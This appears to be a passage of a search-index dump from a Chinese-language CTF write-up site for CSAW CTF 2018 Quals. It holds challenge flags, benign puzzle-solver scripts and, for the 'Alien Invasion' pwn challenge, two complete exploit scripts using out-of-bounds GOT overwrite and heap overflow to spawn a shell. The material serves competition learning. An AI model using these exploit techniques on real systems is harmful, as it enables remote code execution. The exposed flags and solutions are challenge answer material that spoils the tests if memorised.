flag{owmyhand}","title":"Short-Circuit"},{"location":"CSAW-CTF-2018-Quals/misc/Short-Circuit/writeup/#short-circuit","text":"\u7535\u8def\u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u5982\u56fe\u4e2d\u6240\u793a\uff0c\u5c0601\u7edf\u8ba1\u8d77\u6765\uff0c\u7528ascii\u89e3\u7801\u5373\u53ef\u3002 01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001 01101000 01100001 01101110 01100100 01111101 flag: flag{owmyhand}","title":"Short-Circuit"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/","text":"Title \u00b6 Take An L Description \u00b6 Fill the grid with L's but avoid the marked spot for the W Points \u00b6 200 Flag \u00b6 flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L} Notes \u00b6 Provide description.pdf Solution \u00b6 Replace SERVER_ADDRESS and PORT python solver.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#title","text":"Take An L","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#description","text":"Fill the grid with L's but avoid the marked spot for the W","title":"Description"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#points","text":"200","title":"Points"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#flag","text":"flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#notes","text":"Provide description.pdf","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#solution","text":"Replace SERVER_ADDRESS and PORT python solver.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/writeup/","text":"TakeAnL \u00b6 \u7b97\u6cd5\u4e2d\u7684\u68cb\u76d8\u8986\u76d6\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u5206\u6cbb\u601d\u60f3\u6c42\u89e3\u3002 \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/yinaoxiong/article/details/53761608 exp.py from __future__ import print_function from pwn import * def chess ( tr , tc , pr , pc , size ): global mark global table mark += 1 count = mark if size == 1 : return half = size // 2 if pr < tr + half and pc < tc + half : chess ( tr , tc , pr , pc , half ) else : table [ tr + half - 1 ][ tc + half - 1 ] = count chess ( tr , tc , tr + half - 1 , tc + half - 1 , half ) if pr < tr + half and pc >= tc + half : chess ( tr , tc + half , pr , pc , half ) else : table [ tr + half - 1 ][ tc + half ] = count chess ( tr , tc + half , tr + half - 1 , tc + half , half ) if pr >= tr + half and pc < tc + half : chess ( tr + half , tc , pr , pc , half ) else : table [ tr + half ][ tc + half - 1 ] = count chess ( tr + half , tc , tr + half , tc + half - 1 , half ) if pr >= tr + half and pc >= tc + half : chess ( tr + half , tc + half , pr , pc , half ) else : table [ tr + half ][ tc + half ] = count chess ( tr + half , tc + half , tr + half , tc + half , half ) def show ( table ): n = len ( table ) for i in range ( n ): for j in range ( n ): print ( table [ i ][ j ], end = ' ' ) print ( '' ) r = remote ( 'misc.chal.csaw.io' , 9000 ) print ( r . recvuntil ( 'marked block:' )) d = r . recv () print ( d ) a = int ( d [ 2 : 4 ]) b = int ( d [ 5 : 8 ] . rstrip ( ')' )) mark = 0 n = 64 table = [[ - 1 for x in range ( n )] for y in range ( n )] chess ( 0 , 0 , a , b , n ) dict = [] for i in table : for j in i : if j not in dict and j !=- 1 : dict . append ( j ) index = [] for i in range ( len ( dict )): index . append ([]) p = 0 for d in dict : for i in range ( n ): for j in range ( n ): if table [ i ][ j ] == d : index [ p ] . append (( i , j )) else : pass p = p + 1 # show(table) # print(index) ans = '' for i in range ( len ( index )): ans += str ( index [ i ][ 0 ]) + ',' + str ( index [ i ][ 1 ]) + ',' + str ( index [ i ][ 2 ]) + ' \\n ' print ( ans ) r . sendline ( ans ) print ( r . recvline ())","title":"TakeAnL"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/writeup/#takeanl","text":"\u7b97\u6cd5\u4e2d\u7684\u68cb\u76d8\u8986\u76d6\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u5206\u6cbb\u601d\u60f3\u6c42\u89e3\u3002 \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/yinaoxiong/article/details/53761608 exp.py from __future__ import print_function from pwn import * def chess ( tr , tc , pr , pc , size ): global mark global table mark += 1 count = mark if size == 1 : return half = size // 2 if pr < tr + half and pc < tc + half : chess ( tr , tc , pr , pc , half ) else : table [ tr + half - 1 ][ tc + half - 1 ] = count chess ( tr , tc , tr + half - 1 , tc + half - 1 , half ) if pr < tr + half and pc >= tc + half : chess ( tr , tc + half , pr , pc , half ) else : table [ tr + half - 1 ][ tc + half ] = count chess ( tr , tc + half , tr + half - 1 , tc + half , half ) if pr >= tr + half and pc < tc + half : chess ( tr + half , tc , pr , pc , half ) else : table [ tr + half ][ tc + half - 1 ] = count chess ( tr + half , tc , tr + half , tc + half - 1 , half ) if pr >= tr + half and pc >= tc + half : chess ( tr + half , tc + half , pr , pc , half ) else : table [ tr + half ][ tc + half ] = count chess ( tr + half , tc + half , tr + half , tc + half , half ) def show ( table ): n = len ( table ) for i in range ( n ): for j in range ( n ): print ( table [ i ][ j ], end = ' ' ) print ( '' ) r = remote ( 'misc.chal.csaw.io' , 9000 ) print ( r . recvuntil ( 'marked block:' )) d = r . recv () print ( d ) a = int ( d [ 2 : 4 ]) b = int ( d [ 5 : 8 ] . rstrip ( ')' )) mark = 0 n = 64 table = [[ - 1 for x in range ( n )] for y in range ( n )] chess ( 0 , 0 , a , b , n ) dict = [] for i in table : for j in i : if j not in dict and j !=- 1 : dict . append ( j ) index = [] for i in range ( len ( dict )): index . append ([]) p = 0 for d in dict : for i in range ( n ): for j in range ( n ): if table [ i ][ j ] == d : index [ p ] . append (( i , j )) else : pass p = p + 1 # show(table) # print(index) ans = '' for i in range ( len ( index )): ans += str ( index [ i ][ 0 ]) + ',' + str ( index [ i ][ 1 ]) + ',' + str ( index [ i ][ 2 ]) + ' \\n ' print ( ans ) r . sendline ( ans ) print ( r . recvline ())","title":"TakeAnL"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/","text":"Title \u00b6 AlgebrA Description \u00b6 Are you a real math wiz? Points \u00b6 100 Flag \u00b6 flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5} Setup \u00b6 Make sure that competitors can connect to the challenge Solution \u00b6 Programming challenge where you systematically solve for X","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#title","text":"AlgebrA","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#description","text":"Are you a real math wiz?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#flag","text":"flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#solution","text":"Programming challenge where you systematically solve for X","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/writeup/","text":"algebra \u00b6 \u4f7f\u7528z3\u6c42\u89e3\u6216\u8005sympy\u6c42\u89e3 exp1.py from z3 import * from pwn import * context . log_level = \"DEBUG\" #p = process(\"./algebra.py\") p = remote ( \"misc.chal.csaw.io\" , 9002 ) count = 0 p . recvuntil ( '********************************************************************************** \\n ' ) while ( 1 ): equ = p . recvline () p . recvuntil ( \"?:\" ) #eat interstitial e = equ . split ( \" = \" ) s = Solver () X = Real ( \"X\" ) s . add ( eval ( e [ 0 ]) == int ( e [ 1 ] . strip ())) print count print s . check () print ( s . model ()) ans = s . model ()[ X ] anstr = ans . as_string () if \"/\" in anstr : anstr = str ( eval ( anstr + \".0\" )) p . sendline ( anstr ) p . recvline () count += 1 exp2.py from __future__ import division from sympy import * from pwn import * X = Symbol ( 'X' ) r = remote ( 'misc.chal.csaw.io' , 9002 ) print r . recvuntil ( '********************************************************************************** \\n ' ) while 1 : a = r . recvline () print a , ans = str ( eval ( str ( solve ( a . replace ( '=' , '-' )[: - 1 ], X )[ 0 ]))) print ans , r . sendline ( ans ) feedback = r . recvline () print feedback","title":"algebra"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/writeup/#algebra","text":"\u4f7f\u7528z3\u6c42\u89e3\u6216\u8005sympy\u6c42\u89e3 exp1.py from z3 import * from pwn import * context . log_level = \"DEBUG\" #p = process(\"./algebra.py\") p = remote ( \"misc.chal.csaw.io\" , 9002 ) count = 0 p . recvuntil ( '********************************************************************************** \\n ' ) while ( 1 ): equ = p . recvline () p . recvuntil ( \"?:\" ) #eat interstitial e = equ . split ( \" = \" ) s = Solver () X = Real ( \"X\" ) s . add ( eval ( e [ 0 ]) == int ( e [ 1 ] . strip ())) print count print s . check () print ( s . model ()) ans = s . model ()[ X ] anstr = ans . as_string () if \"/\" in anstr : anstr = str ( eval ( anstr + \".0\" )) p . sendline ( anstr ) p . recvline () count += 1 exp2.py from __future__ import division from sympy import * from pwn import * X = Symbol ( 'X' ) r = remote ( 'misc.chal.csaw.io' , 9002 ) print r . recvuntil ( '********************************************************************************** \\n ' ) while 1 : a = r . recvline () print a , ans = str ( eval ( str ( solve ( a . replace ( '=' , '-' )[: - 1 ], X )[ 0 ]))) print ans , r . sendline ( ans ) feedback = r . recvline () print feedback","title":"algebra"},{"location":"CSAW-CTF-2018-Quals/misc/bin_t/","text":"Binary trees let you do some interesting things. Can you balance a tree?","title":"Home"},{"location":"CSAW-CTF-2018-Quals/misc/bin_t/writeup/","text":"bin_t \u00b6 \u7b97\u6cd5\u9898\uff0c\u6784\u9020\u5e73\u8861\u4e8c\u53c9\u67e5\u627e\u6811\u3002 exp.py from pwn import * from pyavltree import AVLTree as Tree def solve (): conn = remote ( 'misc.chal.csaw.io' , 9001 ) print conn . recvline () nums = conn . recvline () nums = list ( int ( i ) for i in nums . strip () . split ( ',' )) t = Tree ( nums ) conn . sendline ( ',' . join ( str ( i ) for i in t . preorder ( t . rootNode ))) conn . interactive () solve ()","title":"bin_t"},{"location":"CSAW-CTF-2018-Quals/misc/bin_t/writeup/#bin_t","text":"\u7b97\u6cd5\u9898\uff0c\u6784\u9020\u5e73\u8861\u4e8c\u53c9\u67e5\u627e\u6811\u3002 exp.py from pwn import * from pyavltree import AVLTree as Tree def solve (): conn = remote ( 'misc.chal.csaw.io' , 9001 ) print conn . recvline () nums = conn . recvline () nums = list ( int ( i ) for i in nums . strip () . split ( ',' )) t = Tree ( nums ) conn . sendline ( ',' . join ( str ( i ) for i in t . preorder ( t . rootNode ))) conn . interactive () solve ()","title":"bin_t"},{"location":"CSAW-CTF-2018-Quals/pwn/alien_invasion/","text":"","title":"Home"},{"location":"CSAW-CTF-2018-Quals/pwn/alien_invasion/writeup/","text":"Construct additional pylons \u6539\u540d\u7684\u65f6\u5019\u672a\u68c0\u67e5\u8f93\u51fa\u7d22\u5f15\u503c\u7684\u5927\u5c0f\uff0c\u56e0\u6b64\u53ef\u6b63\u53ef\u8d1f\uff0c\u53ef\u4ee5\u968f\u610f\u8d8a\u754c\uff0c\u4ece\u800c\u6784\u9020\u5185\u5b58\u6cc4\u9732\u5730\u5740\uff0c\u6700\u7ec8\u6539GOT\u8868\u503c\uff0c\u5c06 strtol \u7684\u503c\u6539\u4e3a system \uff0c\u83b7\u53d6shell\u3002 \u4e0d\u8fc7\u611f\u89c9\u8fd9\u9898\u975e\u9884\u671f\u4e86 \u4e2a\u4eba\u89e3\u6cd5 \u00b6 #!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py -r/-l/-d from pwn import * import argparse import itertools IP = \"pwn.chal.csaw.io\" PORT = 9004 # IP = \"127.0.0.1\" # PORT = 8000 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] BIN = \"./aliensVSsamurais\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) parser = argparse . ArgumentParser () parser . add_argument ( '-d' , '--debugger' , action = 'store_true' ) parser . add_argument ( '-r' , '--remote' , action = 'store_true' ) parser . add_argument ( '-l' , '--local' , action = 'store_true' ) args = parser . parse_args () # context.binary = args.binary # this just hangs??? io = None # this is global process variable binary = ELF ( BIN ) if args . remote : context . noptrace = True io = remote ( IP , PORT ) libc = ELF ( \"./libc-2.23.so\" ) elif args . local or args . debugger : io = process ( BIN ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/alien_invasion/aliensVSsamurais\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) else : parser . print_help () exit () if args . debugger : gdb . attach ( io , ''' aslr off b *0x{:x} b *0x{:x} c ''' . format ( proc_base + 0x0000000000000D39 , # call gets proc_base + 0x0000000000000DAD , # call read # libc_bb + one_gg ) ) ## create two samurai rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"A\" * 7 ) rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"B\" * 7 ) rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"C\" * 7 ) # break rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"3\" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( \"1\" ) rud ( \"How long is my name?\" ) sel ( str ( 0x60 )) rud ( \"What is my name?\" ) sel ( \"B\" * 0x5f ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( - 10 )) rud ( \"Oh great what would you like to rename \" ) data = rud ( \" \\n \" ) . strip ()[: - 4 ] . ljust ( 8 , \" \\x00 \" ) data = u64 ( data ) bin_base = data - 0x0202070 binary . address = bin_base print \"leaked bin base: \" , hex ( bin_base ) io . send ( \" \\x70 \" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 400 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . address + 0x0000000000202700 + 8 )) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 401 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . got [ \"__libc_start_main\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 200 )) rud ( \"Oh great what would you like to rename \" ) data = rud ( \" \\n \" ) . strip ()[: - 4 ] . ljust ( 8 , \" \\x00 \" ) # print data, data.encode(\"hex\") data = u64 ( data ) libc_base = data - libc . symbols [ \"__libc_start_main\" ] libc . address = libc_base print \"leaked libc base: \" , hex ( libc . address ) io . send ( \" \\x40 \" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 401 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . got [ \"strtoul\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 200 )) rud ( \"Oh great what would you like to rename \" ) io . send ( p64 ( libc . symbols [ \"system\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( \"/bin/sh \\x00 \" ) io . interactive () \u5b98\u65b9\u89e3\u6cd5 \u00b6 import argparse import random from pwn import * parser = argparse . ArgumentParser () parser . add_argument ( '-d' , '--debugger' , action = 'store_true' ) parser . add_argument ( '-p' , '--port' ) parser . add_argument ( '-r' , '--remote' ) parser . add_argument ( '-e' , '--elf' ) parser . add_argument ( '-b' , '--binary' ) args = parser . parse_args () context . terminal = '/bin/bash' context . log_level = 'debug' # this is a brute wew # context.binary = args.binary # this just hangs??? p = None # this is global process variable e = None b = None if args . elf : e = ELF ( args . elf ) if args . remote : p = remote ( args . remote , args . port ) # TODO: add a remote service URI here elif args . binary : p = process ( args . binary ) else : parser . print_help () exit () if args . debugger : if args . remote : print ( \"You can't attach a debugger to a remote process\" ) else : gdb . attach ( p ) # if in vagrant just run gdb and attach it. # TODO: Setup enough samurais to beat the final alien def create_sam (): p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 1 )) p . recvuntil ( 'name? \\n ' ) p . sendline ( 'A' * 0x8 ) def kill_sam ( index ): p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 2 )) p . recvuntil ( 'daimyo? \\n ' ) p . sendline ( str ( index )) SAMURAIS = 40 for i in range ( SAMURAIS ): create_sam () # we make room for aliens in the heap to exist. unkillable = [ 3 , 4 , 6 , 7 , 9 , 13 , 14 , 16 ] for i in range ( 9 + len ( unkillable )): if i in unkillable : continue kill_sam ( i ) p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 3 )) # TODO: Alien => alien => libc leak def create_alien ( size , data ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 1 )) p . recvuntil ( 'name? \\n ' ) p . sendline ( str ( size )) p . recvuntil ( 'name? \\n ' ) p . send ( data ) def kill_alien ( index ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 2 )) p . recvuntil ( 'mother? \\n ' ) p . sendline ( str ( index )) def rename_alien ( index , data ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( index )) p . recvuntil ( 'to?' ) p . send ( data ) create_alien ( 0xf8 , 'A' * 0xf7 ) # 0 killed create_alien ( 0x200 , 'B' * 0x1f0 + p64 ( 0x210 )[: - 1 ]) # 1 killed create_alien ( 0xf8 , 'C' * 0xf7 ) # 2 killed create_alien ( 0xf8 , 'D' * 0xf7 ) #3 kill_alien ( 0 ) # kill and overwrite to overflow kill_alien ( 1 ) create_alien ( 0xf8 , 'E' * 0xf8 ) # 4 => overflows and misaligns C's prev_size field. create_alien ( 0xf8 , 'F' * 0xf7 ) # 5 killed create_alien ( 0x80 , 'G' * 0x7f ) # 6 kill_alien ( 5 ) kill_alien ( 2 ) create_alien ( 0xf8 , 'H' * 0xf7 ) # 7 create_alien ( 0x80 , 'I' * 0x79 ) # 8 killed kill_alien ( 8 ) p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( 6 )) # rename the libc leak p . recvuntil ( 'rename ' ) leak = p . recvuntil ( 'to? \\n ' ) leak = leak . strip ( ' to? \\n ' ) leak = u64 ( leak + ' \\x00 ' * ( 8 - len ( leak ))) print ( 'LEAK: ' + hex ( leak )) print ( hex ( e . symbols [ 'puts' ])) main_arena_plus_88 = 0x3c4b78 libc_base = leak - main_arena_plus_88 free_hook = libc_base + e . symbols [ '__free_hook' ] environ = libc_base + e . symbols [ 'environ' ] one_gadget = libc_base + 0x45216 p . send ( p64 ( leak )[: - 1 ]) create_alien ( 0x200 , 'J' * 0xf7 ) # 9 to reset the heap create_alien ( 0xf8 , 'a' * 0xf7 ) # 10 killed create_alien ( 0x200 , 'b' * 0x1f0 + p64 ( 0x210 )[: - 1 ]) # 11 killed create_alien ( 0xf8 , 'c' * 0xf7 ) # 12 killed create_alien ( 0xf8 , 'd' * 0xf7 ) #13 kill_alien ( 10 ) # kill and overwrite to overflow kill_alien ( 11 ) create_alien ( 0xf8 , 'e' * 0xf8 ) # 14 => overflows and misaligns C's prev_size field. create_alien ( 0xf8 , 'f' * 0xf7 ) # 15 killed create_alien ( 0x200 , 'g' * 0x1ff ) # 16 this will be stuck into the \"modified\" position DO NOT KILL kill_alien ( 15 ) kill_alien ( 12 ) payload = 'h' * 0xf8 payload += p64 ( 0x21 ) payload += p64 ( environ ) payload += p64 ( 0x9 )[: - 1 ] create_alien ( len ( payload ) + 1 , payload ) # 17 p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( 16 )) p . recvuntil ( 'rename \\x20 ' ) leak = p . recvuntil ( ' to? \\n ' ) leak = leak . strip ( ' to? \\n ' ) stack_leak = u64 ( leak + ' \\x00 ' * ( 8 - len ( leak ))) p . send ( p64 ( stack_leak )[: - 1 ]) print ( 'Environ: ' + hex ( stack_leak )) kill_alien ( 17 ) ret_offset = - 336 print ( \"Return address overwrite:\" + hex ( stack_leak + ret_offset )) payload = 'h' * 0xf8 payload += p64 ( 0x21 ) payload += p64 ( stack_leak + ret_offset ) payload += p64 ( 0x9 )[: - 1 ] create_alien ( len ( payload ) + 1 , payload ) # 18 in 17's place rename_alien ( 16 , p64 ( one_gadget )[: - 1 ]) # print(\"Puts (for reference): \" + hex(libc_base + e.symbols['puts'])) # print('Free hook: ' + hex(free_hook)) # print('One Gadget: ' + hex(one_gadget)) # pause() p . interactive ()","title":"Alien Invasion | \u6570\u636e\u8d8a\u754c"},{"location":"CSAW-CTF-2018-Quals/pwn/alien_invasion/writeup/#_1","text":"#!/usr/bin/env python2 # coding: utf-8 # Usage: ./exploit.py -r/-l/-d from pwn import * import argparse import itertools IP = \"pwn.chal.csaw.io\" PORT = 9004 # IP = \"127.0.0.1\" # PORT = 8000 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] BIN = \"./aliensVSsamurais\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) parser = argparse . ArgumentParser () parser . add_argument ( '-d' , '--debugger' , action = 'store_true' ) parser . add_argument ( '-r' , '--remote' , action = 'store_true' ) parser . add_argument ( '-l' , '--local' , action = 'store_true' ) args = parser . parse_args () # context.binary = args.binary # this just hangs??? io = None # this is global process variable binary = ELF ( BIN ) if args . remote : context . noptrace = True io = remote ( IP , PORT ) libc = ELF ( \"./libc-2.23.so\" ) elif args . local or args . debugger : io = process ( BIN ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/alien_invasion/aliensVSsamurais\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) else : parser . print_help () exit () if args . debugger : gdb . attach ( io , ''' aslr off b *0x{:x} b *0x{:x} c ''' . format ( proc_base + 0x0000000000000D39 , # call gets proc_base + 0x0000000000000DAD , # call read # libc_bb + one_gg ) ) ## create two samurai rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"A\" * 7 ) rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"B\" * 7 ) rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"1\" ) rud ( \"What is my weapon's name?\" ) sel ( \"C\" * 7 ) # break rud ( \"Daimyo, nani o shitaidesu ka?\" ) sel ( \"3\" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( \"1\" ) rud ( \"How long is my name?\" ) sel ( str ( 0x60 )) rud ( \"What is my name?\" ) sel ( \"B\" * 0x5f ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( - 10 )) rud ( \"Oh great what would you like to rename \" ) data = rud ( \" \\n \" ) . strip ()[: - 4 ] . ljust ( 8 , \" \\x00 \" ) data = u64 ( data ) bin_base = data - 0x0202070 binary . address = bin_base print \"leaked bin base: \" , hex ( bin_base ) io . send ( \" \\x70 \" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 400 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . address + 0x0000000000202700 + 8 )) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 401 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . got [ \"__libc_start_main\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 200 )) rud ( \"Oh great what would you like to rename \" ) data = rud ( \" \\n \" ) . strip ()[: - 4 ] . ljust ( 8 , \" \\x00 \" ) # print data, data.encode(\"hex\") data = u64 ( data ) libc_base = data - libc . symbols [ \"__libc_start_main\" ] libc . address = libc_base print \"leaked libc base: \" , hex ( libc . address ) io . send ( \" \\x40 \" ) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 401 )) rud ( \"Oh great what would you like to rename \" ) sel ( p64 ( binary . got [ \"strtoul\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( str ( 3 )) rud ( \"Brood mother, which one of my babies would you like to rename?\" ) sel ( str ( 200 )) rud ( \"Oh great what would you like to rename \" ) io . send ( p64 ( libc . symbols [ \"system\" ])) rud ( \"Brood mother, what tasks do we have today.\" ) sel ( \"/bin/sh \\x00 \" ) io . interactive ()","title":"\u4e2a\u4eba\u89e3\u6cd5"},{"location":"CSAW-CTF-2018-Quals/pwn/alien_invasion/writeup/#_2","text":"import argparse import random from pwn import * parser = argparse . ArgumentParser () parser . add_argument ( '-d' , '--debugger' , action = 'store_true' ) parser . add_argument ( '-p' , '--port' ) parser . add_argument ( '-r' , '--remote' ) parser . add_argument ( '-e' , '--elf' ) parser . add_argument ( '-b' , '--binary' ) args = parser . parse_args () context . terminal = '/bin/bash' context . log_level = 'debug' # this is a brute wew # context.binary = args.binary # this just hangs??? p = None # this is global process variable e = None b = None if args . elf : e = ELF ( args . elf ) if args . remote : p = remote ( args . remote , args . port ) # TODO: add a remote service URI here elif args . binary : p = process ( args . binary ) else : parser . print_help () exit () if args . debugger : if args . remote : print ( \"You can't attach a debugger to a remote process\" ) else : gdb . attach ( p ) # if in vagrant just run gdb and attach it. # TODO: Setup enough samurais to beat the final alien def create_sam (): p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 1 )) p . recvuntil ( 'name? \\n ' ) p . sendline ( 'A' * 0x8 ) def kill_sam ( index ): p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 2 )) p . recvuntil ( 'daimyo? \\n ' ) p . sendline ( str ( index )) SAMURAIS = 40 for i in range ( SAMURAIS ): create_sam () # we make room for aliens in the heap to exist. unkillable = [ 3 , 4 , 6 , 7 , 9 , 13 , 14 , 16 ] for i in range ( 9 + len ( unkillable )): if i in unkillable : continue kill_sam ( i ) p . recvuntil ( 'ka? \\n ' ) p . sendline ( str ( 3 )) # TODO: Alien => alien => libc leak def create_alien ( size , data ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 1 )) p . recvuntil ( 'name? \\n ' ) p . sendline ( str ( size )) p . recvuntil ( 'name? \\n ' ) p . send ( data ) def kill_alien ( index ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 2 )) p . recvuntil ( 'mother? \\n ' ) p . sendline ( str ( index )) def rename_alien ( index , data ): p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( index )) p . recvuntil ( 'to?' ) p . send ( data ) create_alien ( 0xf8 , 'A' * 0xf7 ) # 0 killed create_alien ( 0x200 , 'B' * 0x1f0 + p64 ( 0x210 )[: - 1 ]) # 1 killed create_alien ( 0xf8 , 'C' * 0xf7 ) # 2 killed create_alien ( 0xf8 , 'D' * 0xf7 ) #3 kill_alien ( 0 ) # kill and overwrite to overflow kill_alien ( 1 ) create_alien ( 0xf8 , 'E' * 0xf8 ) # 4 => overflows and misaligns C's prev_size field. create_alien ( 0xf8 , 'F' * 0xf7 ) # 5 killed create_alien ( 0x80 , 'G' * 0x7f ) # 6 kill_alien ( 5 ) kill_alien ( 2 ) create_alien ( 0xf8 , 'H' * 0xf7 ) # 7 create_alien ( 0x80 , 'I' * 0x79 ) # 8 killed kill_alien ( 8 ) p . recvuntil ( 'today. \\n ' ) p . sendline ( str ( 3 )) p . recvuntil ( 'rename? \\n ' ) p . sendline ( str ( 6 )) # rename the libc leak p . recvuntil ( 'rename ' ) leak = p . recvuntil ( 'to? \\n ' ) leak = leak . strip ( ' to? \\n ' ) leak = u64 ( leak + ' \\x00 ' * ( 8 - len ( leak ))) print ( 'LEAK: ' + hex ( leak )) print ( hex ( e . symbols [ 'puts' ])) main_arena_plus_88 = 0x3c4b78 libc_base = leak - main_arena_plus_88 free_hook = libc_base + e . symbols [ '__free_hook' ] environ = libc_base + e . symbols [ 'environ' ] one_gadget = libc_base + 0x45216 p . send ( p64 ( leak )[: - 1 ]) create_alien ( 